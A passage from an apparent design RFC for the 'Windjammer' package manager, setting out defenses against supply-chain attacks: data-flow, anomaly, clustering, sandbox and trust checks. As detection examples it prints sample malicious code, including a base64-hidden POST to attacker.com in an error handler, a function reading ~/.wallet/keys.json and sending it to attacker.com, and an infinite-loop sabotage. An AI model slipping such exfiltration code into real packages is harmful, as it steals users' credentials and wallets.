fn analyze_semantic_patterns(package: &Package) -> SemanticAnalysis {
    let mut patterns = Vec::new();
    
    // Pattern: "Helper" function that does I/O
    for func in package.all_functions() {
        if func.name.contains("helper") || func.name.contains("util") || func.name.contains("internal") {
            let capabilities = infer_capabilities_for_function(func);
            if capabilities.contains(&Capability::NetEgress) || 
               capabilities.contains(&Capability::FsRead) {
                patterns.push(SemanticPattern::IoInHelperFunction {
                    function: func.name,
                    capabilities,
                    suspicion: High,  // I/O in "helper" functions is suspicious
                });
            }
        }
    }
    
    // Pattern: Error handling that does I/O
    for func in package.all_functions() {
        if has_error_handling(func) {
            let error_path_caps = analyze_error_paths(func);
            if error_path_caps.contains(&Capability::NetEgress) {
                patterns.push(SemanticPattern::IoInErrorPath {
                    function: func.name,
                    explanation: "Network call in error handler (could be exfiltration)",
                });
            }
        }
    }
    
    // Pattern: Obfuscated strings (base64, hex encoding)
    for string_lit in package.all_string_literals() {
        if looks_like_base64(string_lit) || looks_like_hex(string_lit) {
            patterns.push(SemanticPattern::ObfuscatedString {
                value: string_lit,
                decoded: attempt_decode(string_lit),
                suspicion: Medium,
            });
        }
    }
    
    SemanticAnalysis { patterns }
}
```

**Example detection:**
```windjammer
// Malicious code using obfuscation
pub fn process(data: str) -> Result<(), Error> {
    // Legitimate processing
    let result = transform(data)?;
    
    // Error handler with hidden exfiltration
    if result.is_err() {
        // Base64-encoded URL to hide from casual review
        let endpoint = decode_base64("aHR0cHM6Ly9hdHRhY2tlci5jb20vZXhmaWx0cmF0ZQ==");
        http.post(endpoint, data);  // Hidden in error path
    }
    
    Ok(())
}
```

**Compiler detection:**
```
🚩 OBFUSCATION DETECTED

Pattern: Base64-encoded string
Value: "aHR0cHM6Ly9hdHRhY2tlci5jb20vZXhmaWx0cmF0ZQ=="
Decoded: "https://attacker.com/exfiltrate"

Usage: Passed to http.post() in error handler

Explanation: Network URL is obfuscated using base64 encoding.
This pattern is used to hide malicious behavior from code review.

Severity: HIGH
Verdict: SUSPICIOUS (likely malicious)
```

#### Complexity-Based Heuristics

**Detect unusually complex code (possible obfuscation):**

```rust
fn analyze_complexity(func: &Function) -> ComplexityMetrics {
    ComplexityMetrics {
        cyclomatic_complexity: calculate_cyclomatic(func),
        nesting_depth: calculate_max_nesting(func),
        function_length: func.body.lines.len(),
        variable_count: count_variables(func),
        dead_code_percentage: calculate_dead_code(func),
    }
}

fn is_suspiciously_complex(metrics: &ComplexityMetrics, purpose: PackagePurpose) -> bool {
    match purpose {
        PackagePurpose::Parser => {
            // Parsers can be complex, but not THIS complex
            metrics.cyclomatic_complexity > 50 ||
            metrics.nesting_depth > 8 ||
            metrics.dead_code_percentage > 30.0
        }
        PackagePurpose::HttpClient => {
            // HTTP clients should be simple wrappers
            metrics.cyclomatic_complexity > 20 ||
            metrics.nesting_depth > 5
        }
        _ => false
    }
}
```

**Example:**
```
Complexity analysis: parse() function

Cyclomatic complexity: 87 🚩 (Expected: <50 for parsers)
Nesting depth: 12 🚩 (Expected: <8)
Function length: 450 lines ⚠️  (Expected: <300)
Dead code: 35% 🚩 (Expected: <10%)

Verdict: Unusually complex for a parser.
Possible obfuscation or poor code quality.
Recommendation: Manual review required.
```

#### Behavioral Clustering

**Group packages by actual behavior, not metadata:**

```rust
struct BehaviorCluster {
    id: ClusterId,
    typical_capabilities: HashSet<Capability>,
    typical_api_patterns: Vec<ApiPattern>,
    typical_complexity: ComplexityRange,
    member_count: usize,
    malicious_member_count: usize,  // Known malicious packages
}

fn cluster_by_behavior(packages: &[Package]) -> Vec<BehaviorCluster> {
    // Extract feature vectors
    let features: Vec<FeatureVector> = packages.iter()
        .map(|p| extract_features(p))
        .collect();
    
    // K-means clustering on behavioral features
    let clusters = kmeans(&features, k=20);
    
    // Identify high-risk clusters
    for cluster in &mut clusters {
        if cluster.malicious_member_count > 0 {
            cluster.risk_level = RiskLevel::High;
        }
    }
    
    clusters
}
```

**Example:**
```
Package clustering results:

Cluster #5: "Pure Parsers"
├─> Members: 1,244 packages
├─> Typical capabilities: [logic_only]
├─> Typical API: parse(), decode(), stringify()
├─> Malicious members: 0 (0%)
└─> Risk level: LOW

Cluster #18: "Data Exfiltrators"
├─> Members: 47 packages
├─> Typical capabilities: [logic_only, net_egress]
├─> Typical API: parse(), process() + hidden network calls
├─> Malicious members: 43 (91%)
└─> Risk level: CRITICAL

Analyzing json-parser@1.0.0...
├─> Feature vector: [parse API, net_egress, hidden network call]
├─> Closest cluster: #18 (Data Exfiltrators)
├─> Distance from cluster center: 0.12 (very close)
└─> Verdict: MALICIOUS (matches known malicious pattern)
```

### Statistical Anomaly Detection

**Compare against ecosystem:**
```rust
struct CapabilityStats {
    // From package registry (crates.io, npm, etc.)
    category: String,
    total_packages: usize,
    capability_frequency: HashMap<Capability, f64>,
}

fn assess_anomaly(package: &Package, stats: &CapabilityStats) -> AnomalyScore {
    let profile = detect_profile(package);
    let verified = analyze_capabilities(package);
    
    let mut score = 0.0;
    
    for cap in verified {
        let frequency = stats.capability_frequency.get(cap).unwrap_or(&0.0);
        
        if *frequency < 0.01 {  // <1% of similar packages use this capability
            score += 10.0;  // High anomaly
        } else if *frequency < 0.10 {  // <10%
            score += 5.0;   // Moderate anomaly
        }
    }
    
    AnomalyScore {
        score,
        confidence: calculate_confidence(&verified, &stats),
        verdict: if score > 15.0 { Verdict::HighRisk } 
                 else if score > 5.0 { Verdict::Review } 
                 else { Verdict::Safe }
    }
}
```

**Example:**
```
Analyzing json-parser@1.0.0...

Statistical analysis:
  ├─> Category: parser
  ├─> Total similar packages: 1,247
  ├─> Packages using net_egress: 3 (0.24%) ⚠️
  ├─> Packages using spawn: 0 (0.00%) 🚩
  └─> Anomaly score: 18.5 / 20 (HIGH RISK)

Conclusion: This package is a statistical outlier.
```

---

## Gaming Resistance: Adversarial Security Design

### The Challenge

**Windjammer is open-source.** Attackers will:
1. Read the RFC (this document!)
2. Study the heuristics
3. Craft malware that bypasses detection
4. Example: "Oh, they check cyclomatic complexity? I'll split my malicious code into tiny functions."

**We must assume attackers have complete knowledge of our detection mechanisms.**

### Defense Strategy: Multi-Dimensional, Adversarially Robust Heuristics

#### Principle 1: No Single Point of Failure

**Bad approach (gameable):**
```rust
// ❌ Easy to bypass
if cyclomatic_complexity > 50 {
    return Verdict::Suspicious;
}
// Attacker: "I'll just split functions to get complexity < 50"
```

**Good approach (hard to game):**
```rust
// ✅ Multiple independent signals
let signals = vec![
    check_cyclomatic_complexity(func),
    check_data_flow_patterns(func),
    check_call_graph_structure(func),
    check_information_flow(func),
    check_behavioral_clustering(func),
    check_statistical_outliers(func),
];

// ALL must be within acceptable ranges
let verdict = aggregate_signals(signals);
```

**Why this is hard to game:**
- Attacker must optimize for ALL signals simultaneously
- Multi-objective optimization is NP-hard
- Satisfying one constraint often violates another

#### Principle 2: Behavioral Properties That Are Fundamental

**Properties that are hard to fake without breaking functionality:**

##### 1. Data Flow is Unfakeable

**Malicious code MUST move data from source to sink:**
```
UserInput → ... → Network  (exfiltration)
CredentialFile → ... → Network  (theft)
UserInput → ... → ShellCommand  (injection)
```

**Attacker cannot hide this without breaking their attack.**

```rust
fn detect_sensitive_flows(cfg: &ControlFlowGraph) -> Vec<SensitiveFlow> {
    // Find ALL paths from sources to sinks
    let sources = find_sources(cfg);  // User input, files, env vars
    let sinks = find_sinks(cfg);  // Network, shell, filesystem
    
    let mut flows = Vec::new();
    
    for source in sources {
        for sink in sinks {
            for path in cfg.all_paths_between(source, sink) {
                if is_sensitive_flow(source, sink) {
                    flows.push(SensitiveFlow {
                        source,
                        sink,
                        path,
                        sanitizers: find_sanitizers_on_path(&path),
                    });
                }
            }
        }
    }
    
    flows
}
```

**Gaming attempt:**
```windjammer
// Attacker tries to obfuscate flow
pub fn parse(text: str) -> Value {
    let x = text;
    let y = helper1(x);
    let z = helper2(y);
    let w = helper3(z);
    send_data(w);  // Eventually calls http.post()
    
    tokenize(text)
}
```

**Still detected:**
```
Data flow traced:
  text (UserInput) → x → y → z → w → http.post() (Network)

Path length: 5 hops
Sanitizers on path: None

Verdict: Suspicious (unsanitized user input to network)
```

##### 2. Information Flow is Fundamental

**Measure actual information flow, not code structure:**

```rust
fn calculate_information_flow(func: &Function) -> InformationFlowMetrics {
    // How much information flows from inputs to outputs?
    let taint_analysis = perform_taint_analysis(func);
    
    InformationFlowMetrics {
        input_to_output: taint_analysis.input_influences_output,
        input_to_network: taint_analysis.input_influences_network,
        file_to_network: taint_analysis.file_influences_network,
        
        // Key metric: Does input "leak" to unintended sinks?
        information_leakage: calculate_leakage(&taint_analysis),
    }
}
```

**Example:**
```windjammer
// Legitimate parser
pub fn parse(text: str) -> Value {
    // All input → output (legitimate)
    tokenize(text).build_ast()
}
// Information flow: 100% input → return value (expected)

// Malicious parser
pub fn parse(text: str) -> Value {
    let result = tokenize(text).build_ast()
    http.post("attacker.com", text)  // Leakage!
    result
}
// Information flow: 100% input → return + 100% input → network (SUSPICIOUS)
```

**Attacker cannot reduce information flow to network without breaking their exfiltration.**

##### 3. Statistical Properties Are Emergent

**Attackers cannot control ecosystem-wide statistics:**

```rust
fn compare_to_ecosystem(fingerprint: &BehaviorFingerprint) -> AnomalyScore {
    // Load ecosystem statistics (10,000+ packages)
    let ecosystem = load_ecosystem_stats();
    
    // Calculate how unusual this package is
    let mut anomaly = 0.0;
    
    // For each capability, compare frequency
    for cap in &fingerprint.capabilities {
        let frequency = ecosystem.packages_with_purpose(fingerprint.purpose)
            .iter()
            .filter(|p| p.uses_capability(cap))
            .count() as f64 / ecosystem.total_packages as f64;
        
        // Rare capabilities are suspicious
        if frequency < 0.01 {  // <1% use this
            anomaly += 10.0;
        } else if frequency < 0.05 {  // <5%
            anomaly += 5.0;
        }
    }
    
    AnomalyScore { score: anomaly }
}
```

**Why this is hard to game:**
- Attacker would need to make their malware match the statistical distribution
- But the distribution represents LEGITIMATE packages
- Matching the distribution means behaving like legitimate packages (not malicious)
- It's a catch-22: Be normal (not detected) OR be malicious (detected)

##### 4. Graph Topology is Structural

**Call graph and CFG structure reveal intent:**

```rust
fn analyze_graph_topology(package: &Package) -> GraphMetrics {
    let call_graph = build_call_graph(package);
    let cfg = build_control_flow_graph(package);
    
    GraphMetrics {
        // Shape metrics (hard to fake)
        avg_out_degree: call_graph.average_out_degree(),
        clustering_coefficient: call_graph.clustering_coefficient(),
        betweenness_centrality: call_graph.betweenness_centrality(),
        
        // Structural patterns
        has_star_topology: call_graph.has_star_pattern(),  // One central function
        has_long_chains: call_graph.has_long_chains(),  // Deep call stacks
        has_cycles: cfg.has_cycles(),  // Loops
        
        // Suspicious patterns
        io_at_leaves: are_io_calls_at_leaf_nodes(&call_graph),  // Hidden I/O
        dead_code_ratio: calculate_dead_code_ratio(&cfg),  // Obfuscation
    }
}
```

**Example detection:**
```
Call graph analysis:

Public API: parse()
├─> tokenize()
│   ├─> build_tokens()
│   └─> validate_syntax()
└─> helper_x()
    └─> helper_y()
        └─> helper_z()
            └─> helper_q()
                └─> helper_r()
                    └─> http.post() 🚩

Topology metrics:
├─> Long chain to I/O: 6 hops
├─> I/O at leaf node: true (hidden in deepest function)
├─> Avg chain length for parsers: 2.3 hops
└─> Anomaly: 260% longer than typical

Verdict: Obfuscation pattern detected
```

**Attacker cannot flatten the call graph without exposing the malicious code.**

#### Principle 3: Ensemble Methods with Different Failure Modes

**Use multiple detection techniques that fail in DIFFERENT ways:**

```rust
struct EnsembleDetector {
    detectors: Vec<Box<dyn Detector>>,
}

impl EnsembleDetector {
    fn analyze(&self, package: &Package) -> Verdict {
        let mut verdicts = Vec::new();
        
        // Static analysis
        verdicts.push(self.static_analyzer.analyze(package));
        
        // Dynamic analysis (sandbox)
        verdicts.push(self.sandbox_tester.analyze(package));
        
        // Statistical analysis
        verdicts.push(self.anomaly_detector.analyze(package));
        
        // Machine learning classifier
        verdicts.push(self.ml_classifier.predict(package));
        
        // Graph-based detection
        verdicts.push(self.graph_analyzer.analyze(package));
        
        // Aggregate with voting
        self.vote(verdicts)
    }
    
    fn vote(&self, verdicts: Vec<Verdict>) -> Verdict {
        // If ANY detector says CRITICAL, block
        if verdicts.iter().any(|v| v == Verdict::Critical) {
            return Verdict::Critical;
        }
        
        // If MAJORITY say Suspicious, flag
        let suspicious_count = verdicts.iter().filter(|v| v == Verdict::Suspicious).count();
        if suspicious_count > verdicts.len() / 2 {
            return Verdict::Suspicious;
        }
        
        Verdict::Safe
    }
}
```

**Why this is robust:**
- Static analysis can be evaded with obfuscation → but dynamic analysis catches it
- Dynamic analysis can miss code paths → but static analysis is exhaustive
- Statistical analysis can have false positives → but ML can learn from corrections
- No single evasion technique works against all detectors

#### Principle 4: Proprietary Server-Side Components

**Not all heuristics need to be public:**

```
┌─────────────────────────────────────────┐
│ OPEN SOURCE (Client-Side)              │
├─────────────────────────────────────────┤
│ - Basic capability inference            │
│ - Data flow tracking                    │
│ - Known patterns (sensitive paths, etc.)│
│ - Red flag detection                    │
│                                         │
│ Result: 70% detection rate              │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ PROPRIETARY (Registry Server-Side)      │
├─────────────────────────────────────────┤
│ - Advanced ML models (trained on 100k+) │
│ - Behavioral clustering (proprietary)   │
│ - Adversarial evasion detection         │
│ - Zero-day pattern recognition          │
│ - Attacker fingerprinting               │
│                                         │
│ Result: 99% detection rate              │
└─────────────────────────────────────────┘
```

**Registry analysis includes proprietary models:**
```rust
// Public client-side
let basic_assessment = open_source_analysis(package);

// Query registry for advanced analysis (proprietary)
let advanced_assessment = registry_api.analyze_package(package);

// Combine assessments
let final_verdict = combine(basic_assessment, advanced_assessment);
```

**Why this works:**
- Attackers can study open-source heuristics
- But registry uses additional proprietary detection
- Attacker must bypass BOTH to succeed
- Proprietary models updated frequently (adversarial ML)

#### Principle 5: Adaptive Heuristics (Adversarial Machine Learning)

**Continuously update detection models based on new attacks:**

```rust
struct AdaptiveDetector {
    models: Vec<DetectionModel>,
    attack_history: AttackDatabase,
}

impl AdaptiveDetector {
    fn update_models(&mut self) {
        // When new attack is discovered:
        // 1. Add to attack database
        // 2. Retrain models to detect this pattern
        // 3. Deploy updated models to registry
        
        for attack in self.attack_history.recent_attacks() {
            // Extract features from attack
            let features = extract_features(&attack);
            
            // Retrain classifier
            self.models.iter_mut().for_each(|model| {
                model.retrain_with_negative_example(features.clone());
            });
        }
        
        // Adversarial testing: Generate evasion attempts
        for model in &self.models {
            let evasion_attempts = generate_evasion_attempts(model);
            
            // If evasion succeeds, strengthen model
            for attempt in evasion_attempts {
                if model.classify(&attempt) == Verdict::Safe {
                    model.add_negative_example(attempt);
                    model.retrain();
                }
            }
        }
    }
}
```

**Update cycle:**
```
1. New attack discovered (e.g., event-stream)
2. Analyze attack pattern
3. Update detection models
4. Deploy to registry (server-side)
5. Next time attacker tries same pattern → detected
6. Attacker must find NEW evasion → goto 1
```

**This is a cat-and-mouse game, but we have advantages:**
- We can update faster than attackers can adapt
- Each evasion attempt teaches us a new pattern
- Adversarial ML makes models more robust over time

#### Principle 6: Economic Cost of Evasion

**Make bypassing detection EXPENSIVE:**

**Cost to attacker:**
1. Study all heuristics (time)
2. Craft evasion (expert knowledge)
3. Test against detection (trial and error)
4. Maintain evasion as heuristics update (ongoing cost)
5. Risk detection if evasion fails (reputation loss)

**Cost to legitimate developer:**
1. Write code normally (zero cost)
2. If flagged, provide justification (one-time, <1 minute)

**If evasion cost > attack value, attackers give up.**

**Example:**
```
Attack value: Steal credentials from 1000 developers
Evasion cost: 40 hours of expert reverse engineering
Detection risk: 80% (multi-signal detection)
Expected value: (1000 * $value * 0.2) - (40 * $hourly_rate)

If expected value < 0, attack not worth it.
```

#### Principle 7: Transparency Where It Helps, Opacity Where It Hurts

**Be transparent about:**
- Overall approach (this RFC)
- Basic heuristics (capability inference, data flow)
- Red flags (sensitive file access, hidden I/O)

**Keep opaque:**
- Exact thresholds (what anomaly score triggers blocking?)
- Proprietary ML model architectures
- Server-side detection algorithms
- Specific weights in ensemble voting

**Why:**
- Transparency builds trust (open-source community)
- Opacity prevents precise gaming (adversarial security)
- Attackers know WHAT we detect, but not exactly HOW

---

## Windjammer vs. Other Package Managers

### What npm/cargo/pip Do (Metadata-Based)

**Current state of the art:**

| Package Manager | Security Features | Limitations |
|----------------|-------------------|-------------|
| **npm audit** | CVE database lookup, dependency scanning | Only detects KNOWN vulnerabilities (post-incident) |
| **cargo-audit** | RustSec advisory checking | Only detects KNOWN vulnerabilities |
| **pip-audit** | PyPI vulnerability scanning | Only detects KNOWN vulnerabilities |
| **Socket.dev** | Typosquatting detection, registry analysis | Metadata-based (name, author, keywords) |
| **Snyk** | Dependency vulnerability scanning | Known CVEs only, not zero-day |

**Problems with metadata-based approach:**
1. **Reactive, not proactive** - Only catches known vulnerabilities
2. **Gameable** - Attacker controls package name, keywords, description
3. **No code analysis** - Trusts what package claims to do
4. **Zero-day blind** - New attack patterns slip through

### What Windjammer Does (Code-Analysis-Based)

**Windjammer's differentiator:**

```
┌─────────────────────────────────────────────────────┐
│ OTHER PACKAGE MANAGERS (Metadata-Based)            │
├─────────────────────────────────────────────────────┤
│ 1. Check package name ("json-parser")              │
│ 2. Check keywords (["json", "parser"])             │
│ 3. Query CVE database (known vulnerabilities)      │
│ 4. Check download counts, author reputation         │
│ 5. IF known_malicious THEN block ELSE allow        │
│                                                     │
│ Result: Only catches KNOWN attacks                 │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ WINDJAMMER (Code-Analysis-Based)                   │
├─────────────────────────────────────────────────────┤
│ 1. Parse entire codebase (AST analysis)            │
│ 2. Build control flow graph (CFG)                  │
│ 3. Trace data flows (user input → network/files)   │
│ 4. Infer capabilities from ACTUAL code behavior    │
│ 5. Compare to behavioral fingerprint of purpose    │
│ 6. Calculate anomaly score vs. ecosystem           │
│ 7. Detect hidden I/O, obfuscation, complexity      │
│ 8. IF suspicious_behavior THEN block ELSE allow    │
│                                                     │
│ Result: Catches UNKNOWN zero-day attacks           │
└─────────────────────────────────────────────────────┘
```

### Concrete Example: colors Incident (2022)

**Real-world supply chain attack:**

In January 2022, the maintainer of the `colors` npm package (millions of downloads) intentionally sabotaged it:

```javascript
// colors v1.4.1 (malicious)
function getRandomColor() {
    // Infinite loop (DoS attack)
    while (true) {
        console.log('LIBERTY LIBERTY LIBERTY');
    }
}
```

**How other package managers handled it:**

**npm:**
```bash
npm install colors@1.4.1
# ✅ Installs successfully
# ❌ No warning (not in CVE database yet)
# ⏰ CVE added 3 days later (post-incident)
```

**How Windjammer would have handled it:**

```bash
wj add colors@1.4.1
```

**Compiler analysis:**
```
Analyzing colors@1.4.1...

═══════════════════════════════════════════
CODE ANALYSIS
═══════════════════════════════════════════

Function: getRandomColor()
├─> Infinite loop detected: while (true) { ... }
├─> No termination condition
└─> Prints to stdout in infinite loop

Behavioral fingerprint:
├─> Inferred purpose: Terminal formatter
├─> Expected: <logic_only>
├─> Actual: <logic_only, stdout>  (OK)
├─> Loop complexity: INFINITE 🚩

🚩 INFINITE LOOP DETECTED

Function: getRandomColor()
Pattern: while (true) with no break/return

Severity: HIGH
Explanation: Infinite loop causes denial-of-service.
This will hang the application.

Verdict: MALICIOUS (DoS attack)

❌ Import blocked
```

**Key difference:**
- **npm:** Allowed (no CVE yet)
- **Windjammer:** Blocked (detected from code analysis)

### Another Example: event-stream Backdoor (2018)

**Real-world attack:**

The `event-stream` package was compromised to steal cryptocurrency wallet keys.

```javascript
// Malicious code (simplified)
function stealWallet() {
    const walletData = fs.readFileSync(process.env.HOME + '/.wallet/keys.json');
    https.request({
        host: 'attacker.com',
        path: '/collect',
        method: 'POST'
    }).write(walletData);
}
```

**npm behavior:**
```bash
npm install event-stream@3.3.6
# ✅ Installed (not in CVE database)
# ⏰ Detected 3 months later
# 💸 Millions in cryptocurrency stolen
```

**Windjammer behavior:**
```bash
wj add event-stream@3.3.6
```

**Compiler analysis:**
```
🚨 CREDENTIAL THEFT DETECTED

Data flow:
├─> Source: fs.readFileSync("~/.wallet/keys.json")
├─> Sink: https.request("attacker.com", ...)
└─> Pattern: Credential file → Network

Severity: CRITICAL
Explanation: Reads cryptocurrency wallet keys and sends to external server.

Verdict: MALICIOUS (blocked, cannot override)

❌ Import blocked
```

**Result: Attack prevented before any code executes.**

### Why This Matters

**Time to detection:**

| Attack | npm/cargo/pip | Windjammer |
|--------|--------------|------------|
| **colors (DoS)** | 3 days (manual report) | <1 second (compile-time) |
| **event-stream (wallet theft)** | 3 months (discovered by accident) | <1 second (compile-time) |
| **ua-parser-js (cryptominer)** | 4 hours (manual report) | <1 second (compile-time) |
| **Log4Shell equivalent** | Post-incident (CVE database) | <1 second (compile-time) |

**Coverage:**

| Attack Type | npm/cargo/pip | Windjammer |
|------------|--------------|------------|
| **Known CVEs** | ✅ (database lookup) | ✅ (database lookup) |
| **Zero-day attacks** | ❌ (not in database) | ✅ (code analysis) |
| **Hidden exfiltration** | ❌ (no code analysis) | ✅ (data flow analysis) |
| **Obfuscated malware** | ❌ (relies on signatures) | ✅ (behavioral analysis) |
| **Typosquatting** | ⚠️ (name similarity) | ✅ (code analysis + name) |

---

## Community Trust Signals

### Package Registry Integration

**On first import, query package registry API:**

```rust
struct RegistryInfo {
    // Package metadata
    downloads: u64,
    age_days: u64,
    last_updated: DateTime,
    
    // Maintainer info
    maintainer_reputation: f64,  // 0.0 - 1.0
    maintainer_verified: bool,
    
    // Security info
    security_audits: Vec<Audit>,
    known_cves: Vec<CVE>,
    dependency_count: usize,
    
    // Community signals
    github_stars: u64,
    open_issues: u64,
    closed_issues: u64,
    
    // Trust badges
    audited_by: Vec<String>,  // "RustSec", "npm audit", etc.
    verified_publisher: bool,
}

fn calculate_trust_score(info: &RegistryInfo) -> TrustScore {
    let mut score = 0.0;
    
    // Age and popularity
    if info.age_days > 365 { score += 2.0; }  // >1 year old
    if info.downloads > 100_000 { score += 3.0; }  // Popular
    
    // Maintainer reputation
    score += info.maintainer_reputation * 5.0;
    if info.maintainer_verified { score += 2.0; }
    
    // Security audits
    score += info.security_audits.len() as f64 * 3.0;
    
    // Penalty for CVEs
    score -= info.known_cves.len() as f64 * 5.0;
    
    // Too many dependencies is risky
    if info.dependency_count > 50 { score -= 2.0; }
    
    TrustScore {
        score: score.max(0.0).min(10.0),
        verdict: if score > 7.0 { TrustLevel::High }
                 else if score > 4.0 { TrustLevel::Medium }
                 else { TrustLevel::Low }
    }
}
```

**Example output:**
```
Analyzing json-parser@1.0.0...

Registry information:
  ├─> Downloads: 1,247 (last week)
  ├─> Age: 3 days ⚠️
  ├─> Maintainer: unknown-user (NEW ACCOUNT) 🚩
  ├─> Security audits: 0
  ├─> Dependencies: 2
  └─> Trust score: 1.5 / 10 (LOW)

⚠️  WARNING: Low trust score
  - Package is very new (3 days old)
  - Maintainer has no reputation history
  - No security audits performed

Recommendation: Wait for community validation or audit manually.
```

### Combined Scoring

```rust
struct SecurityAssessment {
    profile_violation: Option<ProfileViolation>,
    anomaly_score: AnomalyScore,
    trust_score: TrustScore,
    final_verdict: Verdict,
}

fn assess_package(package: &Package) -> SecurityAssessment {
    let profile = detect_profile(package);
    let verified = analyze_capabilities(package);
    
    // Check profile violations (highest priority)
    if let Some(violation) = check_profile_violations(&verified, &profile) {
        return SecurityAssessment {
            profile_violation: Some(violation),
            final_verdict: Verdict::Blocked,  // Hard block
            ..
        };
    }
    
    // Statistical analysis
    let anomaly = assess_anomaly(package);
    
    // Community trust
    let trust = calculate_trust_score(package);
    
    // Combine signals
    let final_verdict = if anomaly.verdict == Verdict::HighRisk {
        Verdict::Blocked
    } else if anomaly.verdict == Verdict::Review && trust.verdict == TrustLevel::Low {
        Verdict::RequireApproval
    } else if trust.verdict == TrustLevel::High {
        Verdict::Allow
    } else {
        Verdict::RequireApproval
    };
    
    SecurityAssessment {
        profile_violation: None,
        anomaly_score: anomaly,
        trust_score: trust,
        final_verdict,
    }
}
```

---

## Sandboxed Test Execution

### Dynamic Analysis During Import

**Idea:** Run the package's test suite in a sandboxed environment and observe actual behavior.

```bash
wj add json-parser --verify
```

**Workflow:**
```
1. Download package
2. Create isolated sandbox (Docker/Firecracker/WASM)
3. Run package test suite
4. Monitor system calls (via strace/dtrace)
5. Compare observed vs. declared capabilities
6. Flag discrepancies
```

**Implementation:**
```rust
fn sandbox_test(package: &Package) -> SandboxReport {
    let sandbox = Sandbox::new()
        .deny_network()  // Block network by default
        .deny_filesystem()  // Block filesystem by default
        .allow_tmp_dir();  // Allow /tmp only
    
    let result = sandbox.run(|| {
        package.run_tests()
    });
    
    SandboxReport {
        syscalls_attempted: result.syscalls,
        network_attempts: result.network_attempts,
        file_accesses: result.file_accesses,
        violations: result.violations,
    }
}
```

**Example:**
```
Sandboxing json-parser@1.0.0 test suite...

Test results:
  ├─> Tests passed: 45 / 45 ✅
  └─> Duration: 1.2s

System call monitoring:
  ├─> Network attempts: 3 🚩
  │   └─> connect("attacker.com:443") ❌ BLOCKED
  ├─> File accesses: 12
  │   └─> read("/tmp/test.json") ✅
  └─> Process spawning: 0

🚨 SANDBOX VIOLATION DETECTED

Package attempted network access during testing.
This is SUSPICIOUS for a JSON parser.

Package declares: [logic_only]
Sandbox observed: [logic_only, net_egress:attacker.com]

Verdict: MALICIOUS
```

### Performance Considerations

**Sandboxed testing is slow (~1-5 seconds per package).**

**Strategies:**
1. **Cache results** - Store sandbox reports in registry
2. **CI-based** - Run sandboxing in package registry CI, not locally
3. **Opt-in** - `--verify` flag for paranoid mode
4. **Background** - Sandbox in background while developer continues working

---

## Graduated Trust Model

### Paranoid Mode (Default for Production)

```toml
# wj.toml
[security]
mode = "paranoid"  # restrictive | paranoid | permissive
```

**Paranoid mode rules:**
1. **Unknown packages**: Block by default, require explicit `--trust`
2. **Low trust score (<4.0)**: Require approval
3. **Profile violations**: Hard block (cannot override)
4. **New packages (<30 days old)**: Flag for review

**Example:**
```bash
wj add json-parser  # In paranoid mode
```

**Output:**
```
🔒 PARANOID MODE: Package blocked

Package: json-parser@1.0.0
Trust score: 1.5 / 10 (LOW)
Age: 3 days (NEW)
Profile: parser

Blocking reasons:
  1. Trust score below threshold (4.0)
  2. Package age below threshold (30 days)

To override (NOT recommended for production):
  wj add json-parser --trust --audit "Reviewed source code manually"

To search for alternatives:
  wj search json:trusted
```

### Graduated Capabilities

**Idea:** New packages start with minimal capabilities, gain more over time.

```toml
[profiles.parser-new]  # For packages <90 days old
expected = ["logic_only"]
allow_with_justification = []
forbidden = ["net_egress", "net_ingress", "spawn", "eval", "fs_read:~/*", "fs_write:~/*"]

[profiles.parser-established]  # For packages >90 days, >10k downloads
expected = ["logic_only"]
allow_with_justification = ["fs_read:./cache/*", "fs_write:./cache/*"]
forbidden = ["net_egress", "net_ingress", "spawn", "eval"]
```

---

## Handling Legitimate Edge Cases

### Case Study 1: Image Processor with CDN Upload

**Legitimate use case:**
```windjammer
// image-optimizer/src/lib.wj
pub fn optimize_and_upload(path: str, cdn_url: str) -> Result<(), Error> {
    // Read local image
    let image = fs.read_file(path)  // <fs_read>
    
    // Process (resize, compress)
    let optimized = process_image(image)  // <logic_only>
    
    // Write to tmp
    fs.write_file("/tmp/optimized.jpg", optimized)  // <fs_write:/tmp/*>
    
    // Upload to CDN
    http.put(cdn_url, optimized)  // <net_egress>
    
    Ok(())
}
```

**Profile:** `image-processor`
**Expected:** `<logic_only>`
**Actual:** `<logic_only, fs_read, fs_write, net_egress>`

**Without justification:** 🚨 Blocked

**With justification:**
```toml
# image-optimizer/wj.toml
[package]
name = "image-optimizer"
profile = "image-processor"

[security]
justification = """
This package reads local images, processes them (resize/compress),
writes temporary files, and uploads to CDN (S3, Cloudflare, etc.).

Capabilities:
- fs_read: Read input images
- fs_write:/tmp/*: Temporary processing
- net_egress: Upload to CDN

This is a common pattern for image optimization services.
See: https://github.com/image-optimizer/docs/blob/main/ARCHITECTURE.md
"""
```

**Compiler behavior:**
```
Analyzing image-optimizer@2.5.0...

Profile: image-processor
Capabilities: [logic_only, fs_read, fs_write:/tmp/*, net_egress]

⚠️  Capabilities exceed profile expectations

Expected: [logic_only]
Actual: [logic_only, fs_read, fs_write, net_egress]

Justification provided: ✅
  "Reads local images, processes, uploads to CDN..."
  Documentation: https://github.com/.../ARCHITECTURE.md

Trust signals:
  ├─> Downloads: 1.2M / month
  ├─> Age: 3 years
  ├─> Trust score: 8.5 / 10 (HIGH)
  └─> Security audits: 2 (RustSec, OWASP)

Verdict: ALLOW (legitimate edge case)
```

### Case Study 2: Logger with Remote Sinks

**Legitimate use case:**
```windjammer
// logger/src/lib.wj
pub fn log(level: Level, message: str) {
    // Write to local file
    fs.append_file("./logs/app.log", message)  // <fs_write:./logs/*>
    
    // Also send to Sentry (if configured)
    if let Some(sentry_dsn) = env.get("SENTRY_DSN") {
        http.post(sentry_dsn, message)  // <net_egress, env>
    }
}
```

**Profile:** `logger`
**Expected:** `<fs_write:./logs/*>`
**Actual:** `<fs_write:./logs/*, net_egress, env>`

**With justification:**
```toml
[package]
name = "logger"
profile = "logger"

[security]
justification = """
Optional remote logging to services like Sentry, Datadog, Loggly.

Capabilities:
- fs_write:./logs/*: Local log files
- net_egress: Send logs to remote monitoring (opt-in)
- env:SENTRY_DSN: Configuration for remote service

Remote logging is disabled by default (requires env var).
"""
```

**Verdict:** ALLOW (common pattern for logging libraries)

### Case Study 3: Database Driver with Connection Pooling

**Legitimate use case:**
```windjammer
// postgres-driver/src/lib.wj
pub fn connect(url: str) -> Connection {
    // Network connection to database
    tcp.connect(url)  // <net_egress>
    
    // Cache connection pool to disk (optional)
    if let Some(cache_dir) = env.get("CACHE_DIR") {
